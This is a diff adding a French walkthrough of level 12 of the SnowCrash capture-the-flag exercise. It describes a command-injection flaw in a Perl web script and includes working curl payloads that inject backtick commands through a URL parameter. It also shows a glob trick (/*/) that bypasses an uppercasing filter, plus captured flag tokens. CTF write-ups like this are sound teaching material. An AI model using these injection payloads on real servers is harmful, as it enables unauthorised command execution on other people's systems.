@@ -128,3 +128,19 @@ level11@SnowCrash:~$ cat /tmp/flag
 Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
 
 //LEVEL 12
+On a un serveur codé en Perl qui tourne sous Apache, on a acces au .pl dans le home.
+L'URL peut conternir 2 arguments x et y. Mais on s'aperçoit que le code comporte une faille, on a la ligne @output = `egrep "^$xx" /tmp/xd 2>&1`; dont on pourrait se servir pour faire une injection.
+Mais un curl "localhost:4646/?x=`getflag>/tmp/flag`" serait trop simple.
+Il faut se pencher sur les regexp que le code fait precedemment.
+Il met l'entiereté de la chaine en Majuscules ce qui rend /tmp/ inutilisable car /TMP/ ne sera pas reconnu et pareil pour getflag.
+Sachant que /tmp est le seul répertoire ou l'on peut ecrire des choses, il faut trouver un moyen.
+On va donc utiliser /*/ qui va tous selectionner dont /tmp/.
+Donc a la place de faire le getflag dans l'argument, on va creer un script qui le fera, notre curl devient donc:
+curl "localhost:4646/?x=\`/*/SCRIPT\`"
+
+Et notre script:
+#!/bin/sh
+getflag>/tmp/f
+
+Et voilà!
+g1qKMiRpXf53AWhDaU7FEkczr
